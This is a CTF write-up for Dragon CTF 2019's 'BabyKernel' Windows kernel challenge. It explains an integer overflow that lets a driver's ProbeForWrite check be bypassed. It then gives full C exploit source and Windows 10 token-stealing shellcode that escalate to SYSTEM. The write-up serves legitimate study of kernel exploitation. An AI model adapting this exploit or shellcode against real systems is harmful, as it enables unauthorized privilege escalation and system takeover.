---
title: BabyKernel - Dragon CTF 2019
date: 2020-05-12 13:00:00
categories:
  - Windows
  - Kernel
tags:
  - Windows
  - Kernel
thumbnailImagePosition: right
---

Windows Kernel Exploitation challenge. ProbForWrite Bypass with integer overflow bug
<!-- excerpt -->

### Analysis
We have to escalate priveleges to `SYSTEM` through the vulnerable driver `SecureDrv.sys`. Analysing the driver and provided sample client code, we can see that the IOCTL handler handles three operations; protect, unprotect and act.
```C
\\ IDA decompilation
switch ( v3->Parameters.Read.ByteOffset.LowPart )
  {
    case 0x226203u:
      v6 = Protect;
      goto LABEL_9;
    case 0x226207u:
      v6 = unProtect;
LABEL_9:
      func_pointer = v6;
      break;
    case 0x22620Bu:
      v5 = func_pointer(v3->Parameters.SetFile.DeleteHandle, v3->Parameters.Create.Options);
      if ( v4 )
      {
        ProbeForWrite(v4, 8ui64, 1u);
        *v4 = v5;
      }
      break;
    default:
      LODWORD(v5) = 0xC00000BB;
      break;
  }
```

IOCTL code
```
0x226203 - protect
0x226207 - unprotect
0x22620B - do action
```

We can see that the `protect` and `unprotect` IOCTL codes simply assign the respective function pointer to a variable. The function assigned to the variable is then called with the `do_action` IOCTL code. `Protect` function basically copies the data in the user pointer to a kernel pointer. This data can be retrieved from the kernel pointer using the `unprotect` function.
Both `protect` and `unprotect` functions call [ProbeForWrite](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforwrite) to ensure that the data pointer we pass is a user space address.
`Protect` copies the user data in to the kernel pointer and clears the user pointer.
```C
__int64 __fastcall Protect(void *userptr, unsigned int userlen)
{
  void *ptr; // rdi
  unsigned __int64 len; // rsi

  ptr = userptr;
  if ( userlen > 0xFFF )
    return 0xFFFFFFFFC000000Di64;
  len = userlen;
  ProbeForWrite(userptr, userlen, 1u);
  memcpy(save, ptr, len);
  if ( len >= 0x1000 )
    _report_rangecheckfailure();
  save[len] = 0;
  memset(ptr, 0, len);
  return 0i64;
}
```

`Unprotect` does the opposite by copying the data in the kernel pointer to a user pointer that we control.
```C
__int64 __fastcall Unprotect(_BYTE *userptr, unsigned int userlen)
{
  size_t len; // rbx
  _BYTE *ptr; // r14
  unsigned __int64 i; // rax

  len = userlen;
  ptr = userptr;
  ProbeForWrite(userptr, userlen + 1, 1u);
  i = -1i64;
  do
    ++i;
  while ( save[i] );
  if ( len >= i )
    len = i;
  memcpy(ptr, save, len);
  ptr[len] = 0;
  memset(save, 0, len);
  return 0i64;
}
```

### Vulnerability

The length of the data is specified by the user. `unprotect` function is vulnerable to an integer overflow. If the length provided by the user is 0xffffffff, then the len argument of `ProbForWrite` becomes 0xffffffff+1 = 0x0. `ProbForWrite` doesn't check the pointer passed as argument if the length argument is 0, thus kernel addresses pass the check.
```
; rbx = 0xffffffff+1 = 0x100000000    edx = 0x0
00000000000011DC      lea     edx, [rbx+1]    ; Length    
00000000000011DF      lea     r8d, [rsi+1]    ; Alignment
00000000000011E3      call    cs:ProbeForWrite
```

### Exploitation

We can get an arbitary write with the ProbeForWrite bypass in `unprotect`.

Client code for arbitary write:
```c
int action(int IOCTL_CODE, char* data, int len) {
	DWORD returned;
	BOOL success;
	success = DeviceIoControl(hDevice,
		IOCTL_CODE,
		NULL, NULL,
		nullptr, 0,
		&returned, nullptr
	);
	if (!success) {
		printf("failed");
		return -1;
	}

	success = DeviceIoControl(hDevice,
		IOCTL_ACT,
		data, len,
		nullptr, 0,
		&returned, nullptr
	);
	if (!success) {
		printf("failed");
		return -1;
	}

	return 1;
}

int ArbWrite(char * where, char * what, int len) {
	action(IOCTL_PROTECT, what, len);
	action(IOCTL_UNPROTECT, where, 0xffffffff);
	return 1;
}
```

The function pointer to be executed on the IOCTL call is stored in `SecureDrv+0x4050`, overwriting this value lets us call any function. We can call `protect` and `unprotect` IOCTL handles to get back our arbitary write primitive. Since the setup of the challenge impiles that we are in Medium Mandatory Level, we can use [NtQuerySystemInformation](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation) to obtain the kernel addresses we need.


We overwrite the function pointer with [ExAllocatePoolWithTag](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag) to get an executable region to write our privilege escalation shellcode and thus bypass SMEP. `ExAllocatePoolWithTag` has 3 arguments: `PoolType`, `NumberOfBytes` and `PoolTag`, we control the first 2 arguments, we don't care about the tag. Looking at the IOCTL handler we can see that the return value of the function is passed back to the user, making it convenient to get the address of the rwx region.

Then we copy the shellcode to the pool using the arbitary write and then overwrite the function pointer with the address of the shellcode, and finally execute it. The shellcode replaces the security token of cmd.exe(the parent of the exploit process) with that of the system process.
```C
// https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-1
// Windows 10 x64 EoP shellcode (stealing token) 
// Elevates privelege of parent process (cmd.exe)

mov r9, qword ptr gs:[0x188]
mov r9, qword ptr[r9+0x220]
mov r8, qword ptr[r9+0x3e0]
mov rax, r9
loop1:
mov rax, qword ptr[rax+0x2f0]
sub rax, 0x2f0
cmp qword ptr[rax+0x2e8], r8
jne loop1
mov rcx, rax
add rcx, 0x358
mov rax, r9
loop2:
mov rax, qword ptr[rax+0x2f0]
sub rax, 0x2f0
cmp qword ptr [rax+0x2e8], 4
jne loop2
mov rdx, rax
add rdx, 0x358
mov rdx, qword ptr [rdx]
mov qword ptr [rcx], rdx
ret
```

An important thing to note when performing the arbitary write is the presence of null bytes in the data to be written. The `unprotect` function writes data to the pointer only until the first null byte. You can write in parts to write the whole data, especially in case of the EoP shellcode. You cannot write the function pointer in parts as the function pointer itself needs to be set to perform a write in te first place.

We will be overwriting the function pointer twice; once with `ExAllocatePoolWithTag` and then with pool address containing our payload. So we cannot have any null bytes in these addresses. The exploit may have to be run a number of times after restarting the system to get null free kernel addresses. 


```C
#include<windows.h>
#include<winternl.h>
#include<stdio.h>

#pragma comment(lib,"ntdll.lib")

#define IOCTL_PROTECT 0x226203
#define IOCTL_UNPROTECT 0x226207
#define IOCTL_ACT 0x22620b

HANDLE hDevice;

char EoP[] = "\x65\x4C\x8B\x0C\x25\x88\x01\x00\x00\x4D\x8B\x89\x20\x02\x00\x00\x4D\x8B\x81\xE0\x03\x00\x00\x4C\x89\xC8\x48\x8B\x80\xF0\x02\x00\x00\x48\x2D\xF0\x02\x00\x00\x4C\x39\x80\xE8\x02\x00\x00\x75\xEA\x48\x89\xC1\x48\x81\xC1\x58\x03\x00\x00\x4C\x89\xC8\x48\x8B\x80\xF0\x02\x00\x00\x48\x2D\xF0\x02\x00\x00\x48\x83\xB8\xE8\x02\x00\x00\x04\x75\xE9\x48\x89\xC2\x48\x81\xC2\x58\x03\x00\x00\x48\x8B\x12\x48\x89\x11\xC3";


#define SystemModuleInformation 11
#define SystemExtendedProcessInformation 57
#define SystemHandleInformation 16

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

ULONG64 getDrvBase(const char* drvName) {
	NTSTATUS status;
	ULONG i;
	PRTL_PROCESS_MODULES ModuleInfo;

	ModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate memory for the module list
	if (!ModuleInfo) {
		printf("VirtualAlloc failed (%d)\n", GetLastError());
		return -1;
	}

	if (!NT_SUCCESS(status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, ModuleInfo, 1024 * 1024, NULL))) {
		printf("NtQuerySystemInformation failed(%#x)\n", status);
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return -1;
	}

	ULONG64 drvBase = 0;
	printf("looking for %s ....", drvName);
	for (i = 0; i < ModuleInfo->NumberOfModules; i++) {
		//printf("Image Name  = %s\n", (char *)ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName);
		if (strcmp((const char*)ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName, drvName) == 0) {
			drvBase = (ULONG64)ModuleInfo->Modules[i].ImageBase;
			printf("\n%s : Image Base = %p\n", drvName, (PVOID64)drvBase);

		}
	}
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return drvBase;
}

int action(int IOCTL_CODE, char* data, int len) {
	DWORD returned;
	BOOL success;
	success = DeviceIoControl(hDevice,
		IOCTL_CODE,
		NULL, NULL,
		nullptr, 0,
		&returned, nullptr
	);
	if (!success) {
		printf("failed");
		return -1;
	}

	success = DeviceIoControl(hDevice,
		IOCTL_ACT,
		data, len,
		nullptr, 0,
		&returned, nullptr
	);
	if (!success) {
		printf("failed");
		return -1;
	}

	return 1;
}

int arbWrite(char* where, char* what, int len) {
	int i = 0;
	DWORD n = 0;
	HANDLE hHeap = GetProcessHeap();
	char* addr = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, len + 0x10);
	memcpy(addr, what, len);
	for (i = 0; i < len;) {
		n = strlen(addr);
		if (n == 0)
			n++;
		action(IOCTL_PROTECT, addr + i, n);
		action(IOCTL_UNPROTECT, where + i, 0xffffffff);
		i = i + n;
	}
	HeapFree(hHeap, 0, addr);
	return 1;
}


int main() {
	hDevice = CreateFile(L"\\\\.\\SecureStorage", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("Failed to open device");
		return -1;
	}

	ULONG64 ntoskrnl = getDrvBase("ntoskrnl.exe");
	ULONG64 SecureDrv = getDrvBase("SecureDrv.sys");
	ULONG64 func_ptr = SecureDrv + 0x4050;

	HMODULE hNtos = LoadLibrary(L"ntoskrnl.exe");
	if (hNtos == NULL) {
		printf("LoadLibrary failed\n");
		exit(0);
	}

	ULONG64 ExAllocatePoolWithTag = (ULONG64)GetProcAddress(hNtos, "ExAllocatePoolWithTag");
	if (ExAllocatePoolWithTag == NULL) {
		printf("GetProcAddress Failed\n");
		exit(0);
	}

	ExAllocatePoolWithTag = ntoskrnl + (ExAllocatePoolWithTag - (ULONG64)hNtos);
	printf("ExAllocatePoolWithTag = %p\n", ExAllocatePoolWithTag);
	if (strlen((char*)&ExAllocatePoolWithTag) < 8) {
		printf("ExAllocatePoolWithTag contains null\n");
		return -1;
	}

	// Overwrite function pointer with address of ExAllocatePoolWithTag
	arbWrite((char*)func_ptr, (char*)(&ExAllocatePoolWithTag), 0x8);

	// Allocate executable region and retrive the address.
	DWORD NonPagedPoolExecute = 0;
	DWORD returned;
	ULONG64 shellAddr = 0;
	int i = 20;
	while (--i) {
		shellAddr = 0;
		DeviceIoControl(hDevice,
			IOCTL_ACT,
			(LPVOID)NonPagedPoolExecute, 0x1000,
			&shellAddr, 0,
			&returned, nullptr
		);
		shellAddr++;
		if (strlen((char*)&shellAddr) >= 8)
			break;
	}

	printf("Shellcode Addr = %p\n", shellAddr);
	if (i == 0) {
		printf("Failed to get null free pool addr\n");
		return -1;
	}



	shellAddr = shellAddr + 1;
	// Write shellcode to kernel pool 
	arbWrite((char*)shellAddr, EoP, 0x100);

	// Write shellcode addr to function pointer
	arbWrite((char*)func_ptr, (char*)(&shellAddr), 0x8);

	// Execute token stealing shellcode
	DeviceIoControl(hDevice,
		IOCTL_ACT,
		NULL, NULL,
		nullptr, 0,
		&returned, nullptr
	);


	CloseHandle(hDevice);
}
```
